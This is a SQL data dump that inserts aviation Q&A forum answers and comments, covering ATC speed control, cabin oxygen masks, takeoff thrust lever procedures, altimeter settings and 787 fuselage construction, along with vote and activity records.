INSERT INTO postinstance (post_id, user_id, description) VALUES (219, 7, '&lt;p&gt;SOCAL will do this pretty routinely sequencing arrivals into LAX.  The most common practice is to assign 250 knots at some point, then slow you to 210, then assign 170 or 180 &quot;to the marker&quot; (about 5-6 mile final), at which point you&#x27;ll be slowing to your target approach speed.  So mostly commonly, they are only assigning speed reductions.  However, there are times when they want you to close up space on the aircraft ahead, so they might speed you back up again until the extra distance is closed up -- at which point they slow you back again.&lt;/p&gt;

&lt;p&gt;These instructions are &lt;em&gt;always&lt;/em&gt; given with the implicit understanding that, if you can&#x27;t do it, you&#x27;ll say so... &quot;XYZ123 is unable 250, I can give you 225&quot; or something similar.  If you&#x27;ve already extended flaps so that the higher speed would be near or over an aircraft limitation, that could be a reasonable reply.  (Of course, if you extended flaps 20 miles out from the runway, maybe retracting them again &amp;amp; not annoying SOCAL might be a wiser course of action.)&lt;/p&gt;

&lt;p&gt;Depending on the aircraft type (how fast you can fly clean, and how quickly you can slow to your approach speed so that you are stable for the approach at 1000&#x27; - or whatever your OpSpecs/SOP&#x27;s require), you might be given something else.  Light aircraft are often told to keep a fairly high speed (for them) to the marker, since otherwise they&#x27;re like bicycles on the freeway &amp;amp; slowing down everybody behind them.  On the other hand, they can often decelerate more rapidly than some jets, so staying fast until close in may work out just fine.  Again, if the controller is assigning a speed that&#x27;s too fast until too close, it&#x27;s the pilot&#x27;s job to say, &quot;unable.&quot;&lt;/p&gt;

&lt;p&gt;The controllers at SOCAL are excellent at knowing what the aircraft they&#x27;re working with are capable of, and they are very good at timing the speed reductions so that you end up with about 3 miles separation on short final, so that the runway usage is kept high... as one aircraft is turning off the runway, the next jet is a mile or so out.  Much closer than that &amp;amp; you risk go-arounds if somebody gets nervous or the turning-off aircraft isn&#x27;t expeditious; much farther than that &amp;amp; you aren&#x27;t landing planes as quickly as what you could be.&lt;/p&gt;

&lt;p&gt;Some controllers match the proficiency of the ones at SOCAL; others don&#x27;t compare.  Of course, you don&#x27;t really expect the controller at Podunk to have the same practice in setting up a string of aircraft coming in one after another as those in SOCAL, NORCAL, ATL, ORD, and so forth.  The good ones will use all the tools at their disposal, and sometimes this will include having one aircraft increase their speed for a while.&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (219, 194, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (219, 7, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (219, 7, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (219, 7, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (220, 29, '&lt;p&gt;You did say you need up to date data so wikipedia may don&#x27;t be the best idea but I think it&#x27;s at least worth a try. Much wikipedia articles of airports contain information about runways and approaches.&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (220, 195, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (220, 29, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 19, 16);
INSERT INTO postinstance (post_id, user_id, description) VALUES (221, 15, '&lt;p&gt;It&#x27;s never bad to inform a crew member about anything you think may be abnormal.&lt;/p&gt;

&lt;p&gt;In this special situation, as you know that the oxygen masks deploy automatically if the cabin altitude raises to high, you expect the aircraft to descend in order to allow the pax to breathe normally again. If this doesn&#x27;t happen it would be possible that the crew deployed the masks manually for no reason or the automatism faulty detected a low cabin pressure. In both cases I would expect an announcement that the oxygen masks are not needed and can be put down safely.&lt;/p&gt;

&lt;p&gt;If neither of those options happens something is definitely wrong. Either the pilots already suffered hypoxia or they didn&#x27;t notice the passenger masks drop at all.
In my opinion the cabin crew should be trained to know what&#x27;s normal procedure if masks drop, but I would definitely tell a flight attendant about my concerns if nothing happens after two minutes or so.&lt;/p&gt;

&lt;p&gt;You always have to remember: In high altitudes you become unconscious after less than 30 secs without the mask, and as the masks can only produce a limited amount of oxygen it&#x27;s a &lt;strong&gt;really&lt;/strong&gt; time critical issue to reach the flight-deck and initiate a descend if the pilots are already out of service!&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (221, 189, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (221, 15, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (221, 15, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (221, 15, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (221, 15, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (221, 15, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (221, 15, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (221, 15, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (221, 15, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (221, 15, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (221, 15, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (221, 15, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (221, 15, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (221, 15, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (221, 15, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (221, 15, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (221, 15, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (221, 15, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (221, 15, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (221, 15, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (221, 15, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (221, 15, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (221, 15, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (221, 15, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (221, 15, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (221, 15, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (221, 15, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (221, 15, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (221, 15, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (221, 15, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (221, 15, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (221, 15, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (221, 15, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (221, 15, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (221, 15, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (221, 15, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (221, 15, 'Downvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 2, 1);
INSERT INTO postinstance (post_id, user_id, description) VALUES (222, 19, '&lt;p&gt;The information you are after is, unfortunately, rather distributed.&lt;/p&gt;

&lt;p&gt;Eurocontrol maintains a useful list of websites ordered by state, found here:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.eurocontrol.int/articles/ais-online&quot; rel=&quot;nofollow noreferrer&quot;&gt;European AIS&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Or by registering for an &lt;strong&gt;EAD Basic&lt;/strong&gt; account you can access the European AIS Database in a more centralised and user friendly way, found here:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.ead.eurocontrol.int/eadcms/eadsite/index.php.html&quot; rel=&quot;nofollow noreferrer&quot;&gt;European AIS Database&lt;/a&gt;&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (222, 195, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (222, 19, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (222, 19, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (222, 19, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (222, 19, 'Downvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 1, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (223, 11, '&lt;p&gt;Regardless of who is Pilot Flying, the commander will take control of the thrust levers once the thrust is set. A First Officer acting as Pilot Flying will resume control of the thrust once the commander has removed their hand from the thrust levers at V1 AND the aircraft is airborne.&lt;/p&gt;

&lt;p&gt;The decision to reject lies solely with the commander. As such, once the thrust is set, the First Officer as PF will have no further need to touch the thrust levers until the thrust reduction altitude. Hence the commander will cover the thrust levers in anticipation of rejecting the takeoff.&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (223, 196, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (223, 11, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (223, 11, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 2, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (224, 15, '&lt;p&gt;I would turn it the other way around. Assuming the Dynon EFIS is your main flight instrument I would dial in QNH or QNE (depending on your altitude). Common practise is to always have the second altimeter set to QNE (1013.25hPa; 29.92inHg) but if you do not need an altitude reading in Flight Levels it&#x27;s fine if you set up one altimeter to QFE.&lt;/p&gt;

&lt;p&gt;But remember: Even using this practise you HAVE to change the settings. QFE and QNH are both depending on the local pressure and therefore change pretty often. If you are on a cross country flight you then have to change both altimeters to different settings in order to have a correct altitude and a correct height readout.&lt;/p&gt;

&lt;p&gt;Also make sure that you always use the same altimeter for altitude and the other one for height so you won&#x27;t use faulty values from the wrong altimeter!&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (224, 197, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (224, 15, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (224, 15, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (224, 15, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (225, 48, '&lt;p&gt;The WGS84 standard defines the Earth as an ellipsoid with a semi-axis a = 6378137 m at the equator and a semi-axis b =  6356752.3 m at the pole.&lt;/p&gt;

&lt;p&gt;The circumference of that ellipse can be approximated by:&lt;/p&gt;

&lt;p&gt;C(app)= π (3(a + b) – ((3a+b)(a+3b))^0,5)&lt;/p&gt;

&lt;p&gt;C(app) = 40007862.2 m&lt;/p&gt;

&lt;p&gt;Now, if we take an sphere with r = (a+b)/2 = 6367444.65&lt;/p&gt;

&lt;p&gt;C = 2πr = 40007834 m&lt;/p&gt;

&lt;p&gt;The difference is 28.21 meters for the full circumference. Hence, for the usual distances in aviation, the difference will be of the order of a few meters, and that in the worst case…&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (225, 184, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (225, 48, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 13, 12);
INSERT INTO postinstance (post_id, user_id, description) VALUES (226, 11, '&lt;p&gt;Yes, we can ask pilots to speed up on approach, but it is discouraged and not commonly done. This is because, as an aircraft approaches an airport, the crew will configure it for landing. This includes lowering the flaps, which lowers a number of reference speeds - essentially, making them unable to fly very fast. In order to speed up, they would have to raise the flaps again, which would result in extra workload and bad fuel economy.&lt;/p&gt;

&lt;p&gt;The controller you heard knows this. They used the phrase &quot;if able&quot; to emphasize to the pilots, that they only had to comply if it was convenient for them.&lt;/p&gt;

&lt;p&gt;ICAO provides the following guidance (form Doc 4444):&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;4.6.1.3    Speed adjustments should be limited to those necessary to establish and/or maintain a desired separation minimum or spacing. Instructions involving frequent changes of speed, including alternate speed increases and decreases, should be avoided.&lt;/p&gt;
  
  &lt;p&gt;...&lt;/p&gt;
  
  &lt;p&gt;4.6.3.5    Arriving aircraft should be permitted to operate in a clean configuration for as long as possible. Below 4 550 m (FL 150), speed reductions for turbojet aircraft to not less than 410 km/h (220 kt) IAS, which will normally be very close to the minimum speed of turbojet aircraft in a clean configuration, may be used. &lt;/p&gt;
  
  &lt;p&gt;4.6.3.6    Only minor speed adjustments not exceeding plus/minus 40 km/h (20 kt) IAS should be used for aircraft on intermediate and final approach. &lt;/p&gt;
  
  &lt;p&gt;4.6.3.7    Speed control should not be applied to aircraft after passing a point 7 km (4 NM) from the threshold on final approach.&lt;/p&gt;
&lt;/blockquote&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (226, 194, 'True');
INSERT INTO activity ( post_id, user_id, action) VALUES (226, 11, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (226, 11, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (226, 11, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (226, 11, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (226, 11, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (226, 11, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (226, 11, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (226, 11, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (226, 11, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (226, 11, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (226, 11, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (226, 11, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (226, 11, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (226, 11, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (226, 11, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (226, 11, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (226, 11, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (226, 11, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (226, 11, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (226, 11, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (226, 11, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (226, 11, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (226, 11, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (226, 11, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (226, 11, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (226, 11, 'Downvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 4, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (227, 31, '&lt;p&gt;There is a YouTube video showing the method for creating the structure:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=_GDqxnahwbk&quot; rel=&quot;nofollow noreferrer&quot;&gt;YouTube: 787 Composite Construction&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This video from British Airways shows the joining process:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://youtu.be/SJZk9vNS8NE?t=87&quot; rel=&quot;nofollow noreferrer&quot;&gt;Fuselage Section Joining Process&lt;/a&gt; which you can see is not welded, but riveted together. The sections are lined up and riveted together using joining plates. &lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Since it is not fabricated as a single piece there are bound to be stresses on the joints. Will it effect/endanger the passengers?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;No, not more than any other conventionally constructed fuselage. The joining plates are metal and the structure around them is a metal bulkhead. The 787 fuselage is not a 100% composite construction. &lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Are the same methods used to join the wings?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Yes, if you watch the second linked video in full, you can see the composite wings being bolted to the fuselage structure. The entire wing support structure looks to be a conventional metal structure.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Last but not least, are there problems due to the joints before and if so, what has been done to rectify these problems?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;There are new challenges with any type of new construction technique, here are a few articles that outline the challenges:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.nytimes.com/2013/07/30/business/boeings-787-poses-new-challenges-for-repair-teams.html&quot; rel=&quot;nofollow noreferrer&quot;&gt;NY Times: New Challenges for the Fixers of Boeing’s 787&lt;/a&gt;&lt;br/&gt;
&lt;a href=&quot;https://www.technologyreview.com/s/409929/boeings-composite-problem/&quot; rel=&quot;nofollow noreferrer&quot;&gt;MIT Technology Review: Boeing&#x27;s Composite Problem&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Boeing has said that the 787 is as easy to repair as traditional aluminum skin aircraft. One case in point is the &lt;a href=&quot;http://www.compositesworld.com/blog/post/following-latest-787-fire-time-to-repair-carbon-fiber-fuselage&quot; rel=&quot;nofollow noreferrer&quot;&gt;Ethiopian Airlines aircraft ET-AOP damaged by fire&lt;/a&gt;. The procedure to fix it is to cut out the carbon fiber material and put a &quot;cure in place&quot; patch over the hole. In this case other structure had to be replaced or repaired like stringers and bulkheads. This was the first major airframe repair that Boeing had to undertake. &lt;a href=&quot;http://old.seattletimes.com/html/businesstechnology/2022097759_787repairxml.html&quot; rel=&quot;nofollow noreferrer&quot;&gt;ET-AOP took 18 months to repair&lt;/a&gt; before being returned to service.&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (227, 199, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (227, 31, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (227, 31, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (227, 31, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (227, 31, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (227, 31, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 7, 3);
INSERT INTO postinstance (post_id, user_id, description) VALUES (228, 46, '&lt;p&gt;It appears as though the locking handle for the door has some sort of switch in it to allow for full extension of the door only if the locking handle is pulled full forward and, for whatever reason, the door handle won&#x27;t move into this fully extended detent on its own.  While the workaround is jury rigged at best, it doesn&#x27;t seem to pose a flight safety issue unless the door can&#x27;t be locked when fully closed.  It&#x27;s just another video from an ignoramus in the terminal with a cellphone camera.&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (228, 200, 'True');
INSERT INTO activity ( post_id, user_id, action) VALUES (228, 46, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (228, 46, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (228, 46, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (228, 46, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (228, 46, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (228, 46, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (228, 46, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (228, 46, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (228, 46, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (228, 46, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (228, 46, 'Downvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 11, 6);
INSERT INTO postinstance (post_id, user_id, description) VALUES (229, 9, '&lt;p&gt;&lt;em&gt;If&lt;/em&gt; an &quot;AI Co-pilot&quot; existed, it could likely be integrated on existing airplanes with an auto-pilot system.&lt;/p&gt;

&lt;p&gt;Since your question is a little vague, I&#x27;m going to take a stab at some your hidden assumptions and go from there. I&#x27;m also making the assumption that you&#x27;re talking about the &lt;em&gt;enroute&lt;/em&gt; phase of flight, and leaving the taxiing, take-off and landing in the hands of the human pilot.&lt;/p&gt;

&lt;p&gt;At the risk of (extreme) oversimplifying, an AI system is essentially something that takes in a lot of data, analyzes it (through different algorithms) and outputs data that can then be used to do &lt;em&gt;something.&lt;/em&gt; &lt;/p&gt;

&lt;p&gt;I&#x27;m going to assume that the AI algorithm is supervised and has been trained on a bunch of existing data, and it has been figured out what data is important to make high-probability inferences.&lt;/p&gt;

&lt;p&gt;In-flight, there are multiple sources of data that could be fed to the AI algorithm for it to make probabilistic inferences on what it should do.  These data sources are things like:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Engine monitors (my EDM 700 I think logs 60 data points/second on things such as cylinder head temperature, exhaust gas temperature, RPM, location, power setting, etc.)&lt;/li&gt;
&lt;li&gt;GPS Receivers (3D position)&lt;/li&gt;
&lt;li&gt;AHRS (attitude information)&lt;/li&gt;
&lt;li&gt;ADS-B (Traffic and Weather)&lt;/li&gt;
&lt;li&gt;On-board Weather Radar&lt;/li&gt;
&lt;li&gt;XM Satellite Weather&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;(As an aside, &lt;a href=&quot;https://www.savvyanalysis.com/home&quot; rel=&quot;nofollow noreferrer&quot;&gt;SavvyAnalysis&lt;/a&gt; already does a bit of this type of analysis using the data from your engine monitor).&lt;/p&gt;

&lt;p&gt;So, provided that your &quot;AI Co-pilot&quot; has been properly trained in advance on the same type of data that you are able get from your airplane while in-flight, your AI Co-pilot could ingest the data, and output signals to the auto-pilot which would then fly the airplane. The autopilot controller is simply sending information to a particular servo for a particular control surface (aileron, elevator, etc.) and if your AI Co-pilot can output the same signal, then it could control the servos the same as the autopilot.&lt;/p&gt;

&lt;p&gt;One of the (many) difficulties lies in designing the system to safely handle things that it hasn&#x27;t seen in the training data.&lt;/p&gt;

&lt;p&gt;But to answer your question, it wouldn&#x27;t require the design of a new &lt;em&gt;aircraft&lt;/em&gt;, but rather a new &lt;em&gt;autopilot control system.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;EDIT: Extra thoughts&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;After thinking about your question some more, I was thinking why you might want an AI Co-pilot? I&#x27;m thinking the answer to that might would be for it to either make decisions for you that you are unaware you should be making or to help you make better decisions.  There is existing software that does something like this, called &lt;a href=&quot;http://xavion.com/app/full-description/&quot; rel=&quot;nofollow noreferrer&quot;&gt;Xavion&lt;/a&gt;, which continually figures out where you should land if your engine quits based on the current location and performance of your airplane. It&#x27;s not hooked up to an autopilot, but it wouldn&#x27;t be too far of a stretch to think that sometime in the future, something like this could be a part of the autopilot controller.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Furthermore, Xavion is constantly running engine-out flight
  simulations behind-the-scenes as you fly. The app imagines an engine
  failure every single second, and it checks how your plane would do in
  a power-off glides to every runway at every airport in gliding range.&lt;/p&gt;
  
  &lt;p&gt;For each of these simulated engine failures, Xavion estimates the
  likelihood of a successful landing based on the runway’s length,
  width, proximity to the aircraft, and glide path from your current
  location down to the threshold of that runway. When Xavion has found
  the runway that it believes is most likely to result in a safe
  engine-out landing, it builds a series of hoops from your current
  location to that runway—spiraling, circling, or extending as needed in
  order for the hoops to follow a constant descent angle that your
  airplane should be able to sustain without power.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;When you start to think of something like this, you can start to imagine analyzing real-time weather data and having the system make (or help make) a decision to divert or land based on your performance and experience. However, this is all something that would happen in the auto-pilot controller, so retrofitting it to an airplane with an existing autopilot would be more of a software upgrade than a hardware redesign.&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (229, 201, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (229, 9, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (229, 9, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (229, 9, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (229, 9, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (229, 9, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (229, 9, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (229, 9, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (229, 9, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (229, 9, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (229, 9, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (229, 9, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (229, 9, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (229, 9, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (229, 9, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (229, 9, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (229, 9, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (229, 9, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (229, 9, 'Downvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (230, 47, '&lt;p&gt;While it is unusual to fly the big passenger jet as a drone, this has been done few times in the past. Hence should not be a problem to pass the controls to &lt;a href=&quot;https://en.wikipedia.org/wiki/Titan_(supercomputer)&quot; rel=&quot;nofollow noreferrer&quot;&gt;Titan&lt;/a&gt; if this is the idea. Seems that there was no problem to raise and lower gear remotely.&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (230, 201, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (230, 47, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 11, 8);
INSERT INTO postinstance (post_id, user_id, description) VALUES (231, 5, '&lt;p&gt;As an addition to Ron&#x27;s otherwise good answer, since I feel one aspect was left out.  &lt;/p&gt;

&lt;p&gt;Some airlines (ie. the one I work for) require the commander be in control of the thrust levers until V1 (take-off decision speed). That is because the decision to stop the take-off roll is not a light one, and the captain is the one to make the decision. And as Ron pointed out, there is no time to move hands when needed.  &lt;/p&gt;

&lt;p&gt;The control flow goes as follows (consider F/O as PF)&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;F/O has control of aircraft, announces &quot;take-off&quot;&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;F/O advances the levers to T/O thrust, then lets go of the thrust levers&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;CDR places his hand on the thrust levers&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Airplane accelerates and passes V1, the CDR lets go of the thrust levers&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Once airborne, the F/O takes control of the thrust levers again&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;If the take-off needs to be rejected, the CDR takes control of the aircraft and brings it to a stop using (auto)brakes and reverse thrust while maintaining the aircraft on runway centerline. F/O monitors and informs ATC&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (231, 196, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (231, 5, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (231, 5, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (231, 5, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (231, 5, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (231, 5, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (231, 5, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (231, 5, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (231, 5, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (231, 5, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (231, 5, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (231, 5, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (231, 5, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (231, 5, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (231, 5, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (231, 5, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (231, 5, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (231, 5, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (231, 5, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (231, 5, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (231, 5, 'Downvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (232, 24, 'I am quoting the DO-260B exactly below( appendix A, page A-53).                      &amp;quot;The ADS-B transmitting subsystem will clear all 56 bits of the Airborne Velocity message if no data is received within 2.6 seconds of the previous input data update.&amp;quot;                               The maximum update interval table says 1.3 s is the m.u.i. of Airborne Velocity register.');
INSERT INTO answercomment (post_id, answer_id) VALUES (232, 203);
INSERT INTO activity (post_id, user_id, action) VALUES (232, 24, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (233, 30, 'Would you know where to look to find out if any of these strikes ended in a catastrophic failure of the aircraft?');
INSERT INTO answercomment (post_id, answer_id) VALUES (233, 208);
INSERT INTO activity (post_id, user_id, action) VALUES (233, 30, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
